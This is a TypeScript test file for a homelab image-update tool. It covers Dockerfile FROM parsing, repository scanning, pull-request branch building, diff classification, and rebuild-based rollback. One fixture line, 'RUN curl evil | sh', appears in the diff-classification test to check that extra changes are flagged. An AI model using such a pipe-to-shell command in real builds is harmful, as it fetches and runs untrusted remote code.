import { test, after, beforeEach } from 'node:test'
import assert from 'node:assert/strict'
import { execFileSync } from 'node:child_process'
import { mkdtempSync, mkdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import type { UpdateGroup } from '../src/groups.ts'

/**
 * Our own build, watched through the base image of its Dockerfile's final stage: the scan
 * reads the FROM, the pull request moves it and nothing else, the deploy builds it, and a
 * rollback rebuilds on the old base -- because the local image name does not change with
 * the base, the previous build is not on disk under any name a revert could point at.
 */

const dir = mkdtempSync(join(tmpdir(), 'shipshape-base-'))
process.env.DATA_DIR = join(dir, 'data')
process.env.GITHUB_REPO = 'me/homelab'
const live = join(dir, 'live')
process.env.REPO_DIR = live
delete process.env.NOTIFY_URL
after(() => rmSync(dir, { recursive: true, force: true }))

const { parseFroms, finalBase, rewriteFroms } = await import('../src/compose/dockerfile.ts')
const { scanRepo } = await import('../src/compose/scan.ts')
const { classifyPatch } = await import('../src/gitops/poll.ts')
const { getDb } = await import('../src/db.ts')
const { buildBranch, prTitle } = await import('../src/gitops/pr.ts')
const { prBody } = await import('../src/gitops/body.ts')
const { PolicySchema } = await import('../src/config.ts')
const { buildableServices } = await import('../src/deploy/run.ts')
const { performRollback } = await import('../src/deploy/rollback.ts')
const { composeCalls, fakeIo } = await import('./helpers/deploy-io.ts')

const OLD = 'sha256:' + 'a'.repeat(64)
const NEW = 'sha256:' + 'b'.repeat(64)
const policy = PolicySchema.parse({})

// ------------------------------------------------------------------ the Dockerfile

test('FROM lines are read with their flags, stages and byte ranges', () => {
  const text = `# syntax=docker/dockerfile:1\nFROM --platform=$BUILDPLATFORM node:22-slim AS build\nRUN npm ci\nfrom python:3.13-slim\n`
  const r = parseFroms(text)
  assert.ok(r.ok)
  assert.deepEqual(
    r.froms.map((f) => [f.line, f.image, f.alias]),
    [
      [2, 'node:22-slim', 'build'],
      [4, 'python:3.13-slim', null],
    ],
  )
  assert.equal(text.slice(r.froms[0]!.start, r.froms[0]!.end), 'node:22-slim')
})

test('the base is the final stage, followed back through the stages it names', () => {
  const r = parseFroms(`FROM node:22 AS base\nFROM base AS deps\nRUN x\nFROM deps\n`)
  assert.ok(r.ok)
  const b = finalBase(r.froms)
  assert.ok(b.ok)
  assert.equal(b.from.image, 'node:22')
})

test('what cannot be moved by an edit is refused in words', () => {
  const base = (t: string) => {
    const p = parseFroms(t)
    return p.ok ? finalBase(p.froms) : p
  }
  assert.match((base('FROM node:22 AS b\nFROM scratch\n') as { reason: string }).reason, /scratch/)
  assert.match((base('ARG V=22\nFROM node:${V}\n') as { reason: string }).reason, /build argument/)
  assert.match((base('# escape=`\nFROM node:22\n') as { reason: string }).reason, /escape/)
  assert.match((base('FROM \\\n  node:22\n') as { reason: string }).reason, /continued/)
  assert.match((base('RUN true\n') as { reason: string }).reason, /no FROM/)
})

test('every FROM naming the base moves, and nothing else does', () => {
  const text = `FROM node:22-slim@${OLD} AS build\nRUN echo node:22-slim@${OLD}\nFROM node:22-slim@${OLD}\nCOPY --from=build /a /a\n`
  const r = rewriteFroms(text, `node:22-slim@${OLD}`, `node:22-slim@${NEW}`)
  assert.ok(r.ok)
  assert.equal(r.count, 2)
  assert.equal(r.text, text.replace(`FROM node:22-slim@${OLD} AS`, `FROM node:22-slim@${NEW} AS`).replace(`FROM node:22-slim@${OLD}\nCOPY`, `FROM node:22-slim@${NEW}\nCOPY`))
  assert.match(r.text, new RegExp(`RUN echo node:22-slim@${OLD}`), 'a mention outside FROM is left alone')

  const again = rewriteFroms(r.text, `node:22-slim@${OLD}`, `node:22-slim@${NEW}`)
  assert.ok(!again.ok && again.alreadyApplied, 'past the bump is done, not broken')
  const moved = rewriteFroms(text, 'node:20', 'node:22')
  assert.ok(!moved.ok && !moved.alreadyApplied)
})

// ------------------------------------------------------------------ the scan

test('a watched build is watched through its base; an unwatched one is left alone', () => {
  const repo = mkdtempSync(join(dir, 'scan-'))
  mkdirSync(join(repo, 'app', 'src'), { recursive: true })
  writeFileSync(join(repo, 'app', 'src', 'Dockerfile'), `FROM python:3.13-slim@${OLD}\nRUN pip install x\n`)
  writeFileSync(join(repo, 'app', 'Floating.Dockerfile'), `FROM python:3.13-slim\n`)
  writeFileSync(join(repo, 'app', 'Latest.Dockerfile'), `FROM openvino/model_server:latest-gpu\n`)
  writeFileSync(
    join(repo, 'app', 'docker-compose.yaml'),
    `services:
  pinned:
    build:
      context: ./src
    image: app-local:1
    labels:
      shipshape.watch: "true"
  tagged:
    build:
      context: .
      dockerfile: Floating.Dockerfile
    labels:
      shipshape.watch: "true"
  rolling:
    build:
      context: .
      dockerfile: Latest.Dockerfile
    labels:
      shipshape.watch: "true"
      shipshape.pattern: latest
  remote:
    build: https://github.com/o/r.git#abc
    labels:
      shipshape.watch: "true"
  escaping:
    build:
      context: ../..
    labels:
      shipshape.watch: "true"
  unwatched:
    build: ./src
`,
  )
  const by = Object.fromEntries(scanRepo(repo).map((s) => [s.service, s]))

  assert.deepEqual(by.pinned!.base, { dockerfile: 'app/src/Dockerfile', ref: `python:3.13-slim@${OLD}` })
  assert.equal(by.pinned!.unwatchable, null)
  assert.equal(by.pinned!.watched, true)
  assert.equal(by.pinned!.ref?.repository, 'library/python')
  assert.equal(by.pinned!.ref?.digest, OLD)
  assert.equal(by.pinned!.imageRaw, 'app-local:1', 'the local build name is kept')

  // A version tag without a digest can still move by edit: the tag changes.
  assert.equal(by.tagged!.base?.ref, 'python:3.13-slim')
  assert.equal(by.tagged!.watched, true)

  for (const name of ['rolling', 'remote', 'escaping']) {
    assert.equal(by[name]!.base, null, name)
    assert.equal(by[name]!.watched, false, name)
    assert.ok(by[name]!.unwatchable, name)
    assert.equal(by[name]!.labelProblems.length, 1, name)
  }
  assert.match(by.rolling!.labelProblems[0]!, /floats; pin it by digest/)
  assert.match(by.remote!.labelProblems[0]!, /remote/)
  assert.match(by.escaping!.labelProblems[0]!, /outside this repository/)

  assert.equal(by.unwatched!.base, null)
  assert.deepEqual(by.unwatched!.labelProblems, [], 'nothing is said about a build nobody asked to watch')
})

// ------------------------------------------------------------------ the pull request

test('a FROM-only Dockerfile diff is as clean as an image line; anything else in it is not', () => {
  const f = (filename: string, patch: string) => ({ filename, patch })
  const from = `@@ -1 +1 @@\n-FROM node:22-slim@${OLD}\n+FROM node:22-slim@${NEW}`
  assert.equal(classifyPatch([f('obsidian/Dockerfile', from)], false), 'tag-only')
  assert.equal(classifyPatch([f('minuspod/openvino/Dockerfile', from)], false), 'tag-only')
  assert.equal(classifyPatch([f('app/Build.Dockerfile', from)], false), 'tag-only')
  assert.equal(classifyPatch([f('obsidian/Dockerfile', `${from}\n+RUN curl evil | sh`)], false), 'modified')
  assert.equal(classifyPatch([f('obsidian/entrypoint.sh', from)], false), 'modified')
})

const DOCKERFILE = `# the sync client\nFROM node:22-slim@${OLD} AS build\nRUN npm ci\nFROM node:22-slim@${OLD}\nCOPY --from=build /app /app\n`
const COMPOSE = `services:\n  obsidian-sync:\n    build: .\n    labels:\n      shipshape.watch: "true"\n`

function workRepo(): string {
  const repo = mkdtempSync(join(dir, 'work-'))
  mkdirSync(join(repo, 'obsidian'))
  writeFileSync(join(repo, 'obsidian', 'docker-compose.yaml'), COMPOSE)
  writeFileSync(join(repo, 'obsidian', 'Dockerfile'), DOCKERFILE)
  const q = { cwd: repo, stdio: 'ignore' as const }
  execFileSync('git', ['init', '-q', '-b', 'main'], q)
  execFileSync('git', ['add', '-A'], q)
  execFileSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@t', 'commit', '-qm', 'fixture'], q)
  execFileSync('git', ['update-ref', 'refs/remotes/origin/main', 'HEAD'], q)
  return repo
}

const sh = (cwd: string, args: string[]) => execFileSync('git', args, { cwd, encoding: 'utf8' }).trim()

beforeEach(() => {
  getDb().exec(`DELETE FROM images; DELETE FROM updates; DELETE FROM events`)
  getDb()
    .prepare(
      `INSERT INTO images (stack, service, compose_file, image_ref, registry, repository, current_tag, current_digest,
                           watched, base_dockerfile, last_seen_at)
       VALUES ('obsidian', 'obsidian-sync', 'obsidian/docker-compose.yaml', '', 'docker.io', 'library/node', '22-slim', ?, 1,
               'obsidian/Dockerfile', 'now')`,
    )
    .run(OLD)
})

const group = (from: string, to: string, image = `node:22-slim@${OLD}`): UpdateGroup => ({
  key: null,
  branchKey: null,
  members: [{ id: 7, stack: 'obsidian', service: 'obsidian-sync', image, from_tag: from, to_tag: to, magnitude: 'digest', tier: 'manual' }],
})

const deps = (digest: string | null = NEW) => ({
  prepareFork: async () => {
    throw new Error('not a fork')
  },
  digestFor: async () => digest,
  sourceRepoFor: async () => 'nodejs/node',
})

test('a digest move edits the Dockerfile and commits nothing else', async () => {
  const repo = workRepo()
  const g = group(`22-slim@${OLD}`, `22-slim@${NEW}`)
  const r = await buildBranch(repo, g, 'shipshape/obsidian-obsidian-sync', deps())
  assert.ok(r.ok, (r as { reason?: string }).reason)
  assert.deepEqual(sh(repo, ['diff', '--name-only', 'origin/main', 'HEAD']).split('\n'), ['obsidian/Dockerfile'])
  assert.equal(readFileSync(join(repo, 'obsidian', 'Dockerfile'), 'utf8'), DOCKERFILE.replaceAll(OLD, NEW))
  assert.deepEqual(r.bases.get(7), { dockerfile: 'obsidian/Dockerfile', fromRef: `node:22-slim@${OLD}`, toRef: `node:22-slim@${NEW}`, lines: 2 })

  const title = prTitle(g, r.forks, r.bases)
  assert.equal(title, `chore(deps): obsidian: rebuild obsidian-sync on node 22-slim@${OLD.slice(7, 19)} -> 22-slim@${NEW.slice(7, 19)}`)
  assert.equal(sh(repo, ['log', '-1', '--format=%s']), title)
  const body = prBody(g, policy, new Map([[7, 'nodejs/node']]), r.forks, r.bases)
  assert.match(body, /### Base image/)
  assert.match(body, /built here from `obsidian\/Dockerfile`/)
  assert.match(body, /the 2 stages built/)
})

test('a version bump on a pinned base keeps the pin, or refuses to lose it', async () => {
  const repo = workRepo()
  const r = await buildBranch(repo, group('22-slim', '24-slim'), 'b1', deps())
  assert.ok(r.ok, (r as { reason?: string }).reason)
  assert.match(readFileSync(join(repo, 'obsidian', 'Dockerfile'), 'utf8'), new RegExp(`FROM node:24-slim@${NEW}\n`))

  const repo2 = workRepo()
  const refused = await buildBranch(repo2, group('22-slim', '24-slim'), 'b2', deps(null))
  assert.ok(!refused.ok)
  assert.match(refused.reason, /digest pin would be lost/)
})

test('a Dockerfile already past the bump retires the update; one edited by hand is a person\'s', async () => {
  const repo = workRepo()
  writeFileSync(join(repo, 'obsidian', 'Dockerfile'), DOCKERFILE.replaceAll(OLD, NEW))
  execFileSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@t', 'commit', '-qam', 'by hand'], { cwd: repo })
  execFileSync('git', ['update-ref', 'refs/remotes/origin/main', 'HEAD'], { cwd: repo })
  const done = await buildBranch(repo, group(`22-slim@${OLD}`, `22-slim@${NEW}`), 'b3', deps())
  assert.ok(!done.ok && done.alreadyApplied)

  const other = await buildBranch(workRepo(), group('20-slim', '22-slim', 'node:20-slim'), 'b4', deps())
  assert.ok(!other.ok && !other.alreadyApplied)
  assert.match(other.reason, /no longer builds FROM node:20-slim/)
})

// ------------------------------------------------------------------ deploy and rollback

mkdirSync(join(live, 'obsidian'), { recursive: true })
writeFileSync(join(live, 'obsidian', 'docker-compose.yaml'), `${COMPOSE}  plain:\n    build: ./plain\n  web:\n    image: nginx:1.27.0\n`)
writeFileSync(join(live, 'obsidian', 'Dockerfile'), DOCKERFILE)
const q = { cwd: live, stdio: 'ignore' as const }
execFileSync('git', ['init', '-q'], q)
execFileSync('git', ['add', '-A'], q)
execFileSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@t', 'commit', '-qm', 'fixture'], q)
writeFileSync(join(live, 'obsidian', 'Dockerfile'), DOCKERFILE.replaceAll(OLD, NEW))
execFileSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@t', 'commit', '-qam', 'bump'], q)
const merge = execFileSync('git', ['rev-parse', 'HEAD'], { cwd: live, encoding: 'utf8' }).trim()

test('a deploy builds the watched build; an unwatched build is still never built', () => {
  assert.deepEqual(buildableServices('obsidian', ['obsidian-sync', 'plain', 'web'], policy), ['obsidian-sync'])
  assert.deepEqual(buildableServices('obsidian', ['obsidian-sync'], policy, live, { forks: false }), ['obsidian-sync'])
  assert.deepEqual(buildableServices('obsidian', ['obsidian-sync'], policy, live, { bases: false }), [])
})

test('a rollback rebuilds on the old base, because the image name never moved', async () => {
  const io = fakeIo({ 'obsidian-sync': 'running' }, { rebuildable: (s, svcs) => buildableServices(s, svcs, policy, live, { forks: false }) })
  const r = await performRollback({ stack: 'obsidian', services: ['obsidian-sync'], strategy: 'up', build: ['obsidian-sync'] }, merge, 'squash', { io })
  assert.ok(r.ok, r.detail)
  assert.match(readFileSync(join(live, 'obsidian', 'Dockerfile'), 'utf8'), new RegExp(OLD))
  assert.deepEqual(composeCalls(io.calls), [
    'compose -f obsidian/docker-compose.yaml build obsidian-sync',
    'compose -f obsidian/docker-compose.yaml up -d --no-deps obsidian-sync',
  ])
})

test('the update page previews the Dockerfile hunk the branch would carry', async () => {
  const { buildUpdateDiff } = await import('../src/diff.ts')
  const C = 'sha256:' + 'c'.repeat(64)
  writeFileSync(join(live, 'obsidian', 'Dockerfile'), DOCKERFILE.replaceAll(OLD, NEW))
  getDb().exec(`DELETE FROM updates`)
  const id = Number(
    getDb()
      .prepare(
        `INSERT INTO updates (stack, service, image, from_tag, to_tag, magnitude, tier, state, detected_at, updated_at)
         VALUES ('obsidian', 'obsidian-sync', ?, ?, ?, 'digest', 'manual', 'detected', 'now', 'now')`,
      )
      .run(`node:22-slim@${NEW}`, `22-slim@${NEW}`, `22-slim@${C}`).lastInsertRowid,
  )
  const d = buildUpdateDiff(id)
  assert.ok(!('error' in d), (d as { error?: string }).error)
  const changed = d.hunks.flatMap((h) => h.lines.filter((l) => l.kind !== 'ctx').map((l) => `${l.kind} ${l.text}`))
  assert.equal(d.hunks[0]!.file, 'obsidian/Dockerfile')
  assert.deepEqual(changed.filter((l) => l.startsWith('add')), [`add FROM node:22-slim@${C} AS build`, `add FROM node:22-slim@${C}`])

  // A version bump on a pinned base, with no digest seen for the new tag yet, says what
  // the pull request will do rather than showing an unpinned line it would never carry.
  getDb().prepare(`UPDATE updates SET from_tag = '22-slim', to_tag = '24-slim' WHERE id = ?`).run(id)
  const pending = buildUpdateDiff(id)
  assert.ok('error' in pending)
  assert.match(pending.error, /looks up the digest of 24-slim/)
})
